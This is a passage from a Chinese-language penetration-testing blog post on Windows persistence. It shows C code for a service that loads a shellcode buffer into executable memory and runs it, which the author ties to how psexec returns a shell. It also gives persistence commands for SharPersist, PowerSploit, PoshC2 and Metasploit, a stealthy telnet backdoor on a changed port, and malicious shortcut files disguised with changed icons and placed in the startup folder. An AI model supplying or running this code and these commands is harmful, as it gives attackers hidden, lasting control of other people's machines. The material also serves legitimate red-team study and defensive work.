</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">/*在本例中只接受系统关机和停止服务两种控制命令*/</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwControlsAccepted</span> <span style="color:#ff636f">=</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SERVICE_ACCEPT_SHUTDOWN</span> <span style="color:#ff636f">|</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SERVICE_ACCEPT_STOP</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwWin32ExitCode</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwServiceSpecificExitCode</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwCheckPoint</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwWaitHint</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">hStatus</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">::</span><span style="color:#58a1dd">RegisterServiceCtrlHandler</span>(
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">WserviceName</span>,
</span></span><span style="display:flex;"><span>(<span style="color:#58a1dd">LPHANDLER_FUNCTION</span>)<span style="color:#58a1dd">CtrlHandler</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#58a1dd">hStatus</span> <span style="color:#ff636f">==</span> (<span style="color:#58a1dd">SERVICE_STATUS_HANDLE</span>)<span style="color:#a6be9d">0</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">WriteToLog</span>(<span style="color:#a6be9d">&#34;RegisterServiceCtrlHandler failed&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">WriteToLog</span>(<span style="color:#a6be9d">&#34;RegisterServiceCtrlHandler success&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">/* Initialize Service   */</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">error</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">InitService</span>();
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#58a1dd">error</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">/* Initialization failed  */</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwCurrentState</span> <span style="color:#ff636f">=</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SERVICE_STOPPED</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwWin32ExitCode</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">-</span><span style="color:#a6be9d">1</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SetServiceStatus</span>(<span style="color:#58a1dd">hStatus</span>, <span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">ServiceStatus</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">LPVOID</span> <span style="color:#58a1dd">Memory</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">VirtualAlloc</span>(<span style="color:#58a1dd">NULL</span>, <span style="color:#ff636f">sizeof</span>(<span style="color:#58a1dd">buf</span>), <span style="color:#58a1dd">MEM_COMMIT</span> <span style="color:#ff636f">|</span> <span style="color:#58a1dd">MEM_RESERVE</span>, <span style="color:#58a1dd">PAGE_EXECUTE_READWRITE</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">memcpy</span>(<span style="color:#58a1dd">Memory</span>, <span style="color:#58a1dd">buf</span>, <span style="color:#ff636f">sizeof</span>(<span style="color:#58a1dd">buf</span>));
</span></span><span style="display:flex;"><span>((<span style="color:#ff636f">void</span>(<span style="color:#ff636f">*</span>)())<span style="color:#58a1dd">Memory</span>)();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">/*向SCM 报告运行状态*/</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwCurrentState</span> <span style="color:#ff636f">=</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SERVICE_RUNNING</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SetServiceStatus</span>(<span style="color:#58a1dd">hStatus</span>, <span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">ServiceStatus</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">/*do something you want to do in this while loop*/</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">MEMORYSTATUS</span> <span style="color:#58a1dd">memstatus</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">while</span> (<span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwCurrentState</span> <span style="color:#ff636f">==</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SERVICE_RUNNING</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#ff636f">char</span> <span style="color:#58a1dd">buffer</span>[<span style="color:#a6be9d">16</span>];
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">GlobalMemoryStatus</span>(<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">memstatus</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">int</span> <span style="color:#58a1dd">availmb</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">memstatus</span>.<span style="color:#58a1dd">dwAvailPhys</span> <span style="color:#ff636f">/</span> <span style="color:#a6be9d">1024</span> <span style="color:#ff636f">/</span> <span style="color:#a6be9d">1024</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">sprintf_s</span>(<span style="color:#58a1dd">buffer</span>, <span style="color:#a6be9d">100</span>, <span style="color:#a6be9d">&#34;available memory is %dMB&#34;</span>, <span style="color:#58a1dd">availmb</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">int</span> <span style="color:#58a1dd">result</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">WriteToLog</span>(<span style="color:#58a1dd">buffer</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#58a1dd">result</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwCurrentState</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">SERVICE_STOPPED</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwWin32ExitCode</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">-</span><span style="color:#a6be9d">1</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SetServiceStatus</span>(<span style="color:#58a1dd">hStatus</span>,
</span></span><span style="display:flex;"><span><span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">ServiceStatus</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Sleep</span>(<span style="color:#58a1dd">SLEEP_TIME</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">WriteToLog</span>(<span style="color:#a6be9d">&#34;service stopped&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>这其实也是psexec的原理:建立连接后创建服务反弹shell</p>
<p>删除服务:</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">sc </span><span style="color:#58a1dd">delete</span> <span style="color:#a6be9d">&#34;SD&#34;</span></span></span></code></pre></div><h3 id="其他的一些工具" class="heading-element"><span>其他的一些工具</span>
  <a href="#%e5%85%b6%e4%bb%96%e7%9a%84%e4%b8%80%e4%ba%9b%e5%b7%a5%e5%85%b7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h5 id="sharpersist-1" class="heading-element"><span>SharPersist</span>
  <a href="#sharpersist-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><blockquote>
<p><a href="https://github.com/fireeye/SharPersist"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/fireeye/SharPersist</a></p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">SharPersist</span> <span style="color:#58a1dd">-t</span> <span style="color:#58a1dd">service</span> <span style="color:#58a1dd">-c</span> <span style="color:#a6be9d">&#34;C:\Windows\System32\cmd.exe&#34;</span> <span style="color:#58a1dd">-a</span> <span style="color:#a6be9d">&#34;/c pentestlab.exe&#34;</span> <span style="color:#58a1dd">-n</span> <span style="color:#a6be9d">&#34;pentestlab&#34;</span> <span style="color:#58a1dd">-m</span> <span style="color:#58a1dd">add</span></span></span></code></pre></div><h5 id="powersploit" class="heading-element"><span>PowerSploit</span>
  <a href="#powersploit" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><blockquote>
<p><a href="https://github.com/PowerShellMafia/PowerSploit"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/PowerShellMafia/PowerSploit</a></p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">Set-ServiceBinPath</span> <span style="color:#58a1dd">-Name</span> <span style="color:#58a1dd">pentestlab</span> <span style="color:#58a1dd">-binPath</span> <span style="color:#a6be9d">&#34;cmd.exe /k C:\temp\pentestlab.exe&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Write-ServiceBinary</span> <span style="color:#58a1dd">-Name</span> <span style="color:#58a1dd">pentestlab</span> <span style="color:#58a1dd">-Command</span> <span style="color:#a6be9d">&#34;cmd.exe /k C:\temp\pentestlab.exe&#34;</span></span></span></code></pre></div><h5 id="poshc2-1" class="heading-element"><span>PoshC2</span>
  <a href="#poshc2-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><blockquote>
<p><a href="https://github.com/nettitude/PoshC2_Python"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/nettitude/PoshC2_Python</a></p>
</blockquote>
<pre tabindex="0"><code>install-servicelevel-persistence</code></pre><h5 id="metasploit-1" class="heading-element"><span>Metasploit</span>
  <a href="#metasploit-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><pre tabindex="0"><code>use post/windows/manage/persistence_exe
set REXEPATH /tmp/pentestlab.exe
set SESSION 1
set STARTUP SERVICE
set LOCALEXEPATH C:\\tmp
run</code></pre><h3 id="telnet服务" class="heading-element"><span>telnet服务</span>
  <a href="#telnet%e6%9c%8d%e5%8a%a1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>telnet是命令行下的远程登录工具，不过在服务器管理时使用不多也常为管理员所忽视。攻击者如果在控制一台服务器后，开启“远程桌面”进行远程控制非常容易被管理员察觉，但是启动Telnet进行远程控制却不容易被察觉。不过，telnet的默认端口是23，如果开启后，别人是很容易扫描到的，因此攻击者会更改telnet的端口，从而独享该服务器的控制权。</p>
<h1 id="快捷方式" class="heading-element"><span>快捷方式</span>
  <a href="#%e5%bf%ab%e6%8d%b7%e6%96%b9%e5%bc%8f" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><h2 id="什么是lnk" class="heading-element"><span>什么是LNK</span>
  <a href="#%e4%bb%80%e4%b9%88%e6%98%aflnk" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>lnk文件是用于指向其他文件的一种文件。 这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。</p>
<h2 id="利用手法" class="heading-element"><span>利用手法</span>
  <a href="#%e5%88%a9%e7%94%a8%e6%89%8b%e6%b3%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>为恶意进程创建快捷方式，并将其加入启动程序。</li>
<li>利用当前用户现有的快捷方式进行迷惑，达到既能开启原程序，又能执行恶意程序的效果。</li>
</ol>
<h2 id="利用过程" class="heading-element"><span>利用过程</span>
  <a href="#%e5%88%a9%e7%94%a8%e8%bf%87%e7%a8%8b" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h4 id="直接修改放置启动目录" class="heading-element"><span>直接修改，放置启动目录</span>
  <a href="#%e7%9b%b4%e6%8e%a5%e4%bf%ae%e6%94%b9%e6%94%be%e7%bd%ae%e5%90%af%e5%8a%a8%e7%9b%ae%e5%bd%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><blockquote>
<p>右键快捷方式 &ndash;&gt; 属性 &ndash;&gt; 目标</p>
</blockquote>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170929621.webp" alt="image-20240717092927375" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170929621.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170929621.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407170929621.webp?size=large 2x" data-title="image-20240717092927375" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<blockquote>
<p>通过更改图标来增加迷惑性</p>
</blockquote>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/image-20210714112646184.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714112646184.png" alt="image-20210714112646184" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714112646184.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714112646184.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714112646184.png?size=large 2x" data-title="image-20210714112646184" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<blockquote>
<p>最后放到启动目录即可</p>
</blockquote>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/image-20210714112824723.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714112824723.png" alt="image-20210714112824723" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714112824723.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714112824723.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714112824723.png?size=large 2x" data-title="image-20210714112824723" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h4 id="同时启动两个程序" class="heading-element"><span>同时启动两个程序</span>
  <a href="#%e5%90%8c%e6%97%b6%e5%90%af%e5%8a%a8%e4%b8%a4%e4%b8%aa%e7%a8%8b%e5%ba%8f" class="heading-mark">
